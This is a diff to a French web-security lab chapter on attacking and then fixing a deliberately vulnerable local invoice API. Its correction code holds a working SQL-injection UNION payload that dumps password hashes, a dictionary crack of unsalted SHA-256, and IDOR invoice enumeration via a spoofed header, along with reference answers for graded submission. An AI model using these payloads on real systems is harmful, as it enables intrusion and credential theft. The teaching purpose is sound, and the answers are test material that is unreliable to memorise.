@@ -199,14 +199,31 @@ du code.
 6. Connectez-vous en tant qu'`admin` **sans connaître son mot de passe**.
 7. Connecté·e en tant que `bruno.petit` (en-tête `X-Utilisateur:
    bruno.petit`), lisez les factures des autres.
-8. *Bonus* : réutilisez votre script du chapitre 03, adapté au SHA-256, pour
-   retrouver le mot de passe de l'administrateur.
+8. Réutilisez votre script du chapitre 03, adapté au SHA-256, pour retrouver
+   le mot de passe de l'administrateur à partir de son empreinte.
+
+> 📤 **À rendre** - le mot de passe de l'administrateur (étape 8) et le
+> montant de sa facture confidentielle (étape 7) :
+>
+> ```python
+> consigner("05.mot_de_passe_admin", mdp_admin)
+> consigner("05.montant_confidentiel", montant)
+> ```
 
 <details>
 <summary>Voir la correction</summary>
 
+> Les valeurs ci-dessous sont celles du **jeu de référence**. Votre
+> administrateur a un autre mot de passe, et sa facture un autre montant.
+
 ```python
+import hashlib
+import sys
+
 import requests
+
+sys.path.append("..")
+from rendu import consigner
 
 API = "http://api:5000"
 
@@ -241,9 +258,25 @@ print(requests.post(f"{API}/api/connexion", timeout=5,
 # {'message': 'Bienvenue admin', 'role': 'admin'}
 
 # 7. IDOR : on énumère les identifiants de factures
+montant = None
 for i in range(1, 6):
-    r = requests.get(f"{API}/api/factures/{i}", headers={"X-Utilisateur": "bruno.petit"}, timeout=5)
-    print(i, r.json())
+    facture = requests.get(f"{API}/api/factures/{i}", headers={"X-Utilisateur": "bruno.petit"},
+                           timeout=5).json()
+    print(i, facture)
+    if facture.get("proprietaire") == "admin":
+        montant = facture["montant"]
+
+# 8. Empreinte de l'administrateur cassée au dictionnaire. Les colonnes de
+#    l'UNION portent les noms de la requête d'origine : nom, email, ville.
+utilisateurs = clients("x' UNION SELECT identifiant, mdp_sha256, role FROM utilisateurs --")
+empreinte_admin = next(u["email"] for u in utilisateurs if u["nom"] == "admin")
+with open("../03-crypto/wordlist.txt", encoding="utf-8") as f:
+    table = {hashlib.sha256(m.encode()).hexdigest(): m for m in f.read().split()}
+mdp_admin = table.get(empreinte_admin)
+print("Mot de passe de l'administrateur :", mdp_admin)
+
+consigner("05.mot_de_passe_admin", mdp_admin)
+consigner("05.montant_confidentiel", montant)
 ```
 
 Constats :
@@ -255,8 +288,9 @@ Constats :
   mots de passe, en SHA-256 sans sel (**A04**).
 - À l'étape 7, Bruno lit les factures d'Emma et le contrat confidentiel de
   l'administrateur (**A01**).
-- Bonus : en remplaçant `hashlib.md5` par `hashlib.sha256` dans `casser.py`,
-  on retrouve `Admin2025` pour `admin` et `azerty` pour `bruno.petit`.
+- À l'étape 8, la même attaque par dictionnaire qu'au chapitre 03, en
+  SHA-256, retrouve `Admin2025` pour `admin` (et `azerty` pour
+  `bruno.petit`) : un hachage rapide et sans sel ne protège rien.
 
 Et l'en-tête `X-Utilisateur` lui-même ? N'importe qui peut écrire
 `X-Utilisateur: admin` : c'est une **usurpation** (le S de STRIDE). Une vraie
@@ -276,6 +310,14 @@ Modifiez `app.py` pour corriger :
 Arrêtez l'API (`Ctrl+C`), relancez-la avec `docker compose up api`, et
 rejouez `attaque.py` : plus aucune étape ne doit réussir, et l'usage normal
 (étape 1) doit fonctionner.
+
+> 📤 **À rendre** - votre `app.py` corrigé. Il sera attaqué automatiquement :
+> usage normal, injections, messages d'erreur, contournement de la connexion
+> et IDOR. Gardez les noms des routes et la fonction `initialiser_base`.
+>
+> ```bash
+> python ../rendu.py joindre 05.app app.py
+> ```
 
 <details>
 <summary>Voir la correction</summary>
@@ -329,7 +371,10 @@ Rejouée, l'attaque donne :
 
 - étapes 2 à 5 : une liste vide (aucune ville ne s'appelle `x' OR '1'='1`) ;
 - étape 6 : `identifiants incorrects` ;
-- étape 7 : Bruno ne voit que ses factures 1 et 2.
+- étape 7 : Bruno ne voit que ses factures 1 et 2 ;
+- étape 8 : le script s'arrête sur une erreur `StopIteration`, faute
+  d'empreinte à casser. Il n'atteint donc pas les lignes `consigner` : les
+  bonnes réponses obtenues sur la version vulnérable restent dans votre rendu.
 
 Pour aller jusqu'au bout, il faudrait encore : stocker les mots de passe en
 Argon2id ou scrypt (chapitre 03), remplacer `X-Utilisateur` par un vrai jeton,
